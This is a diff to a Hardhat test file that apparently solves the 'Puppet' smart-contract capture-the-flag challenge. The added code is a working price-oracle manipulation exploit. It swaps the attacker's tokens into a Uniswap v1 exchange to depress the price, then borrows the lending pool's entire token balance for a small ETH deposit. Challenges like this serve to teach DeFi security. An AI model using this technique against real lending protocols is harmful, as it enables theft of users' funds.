@@ -4,6 +4,8 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+const { provider, utils } = ethers;
+
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
     return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
@@ -102,7 +104,35 @@ describe('[Challenge] Puppet', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const token = this.token;
+        const lendingPool = this.lendingPool;
+        const uniswapExchange = this.uniswapExchange;
+
+        let tx;
+        
+        console.log('approve');
+        tx = await this.token.connect(attacker).approve(
+            uniswapExchange.address, 
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        await tx.wait();
+
+        const lastBlock = await ethers.provider.getBlock("latest");
+
+        console.log('swap');
+        tx = await uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1), 
+            1, 
+            lastBlock.timestamp * 2
+        );
+        await tx.wait();
+
+        console.log('borrow');
+        const depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        tx = await lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {
+            value: depositRequired
+        });
+        await tx.wait();
     });
 
     after(async function () {
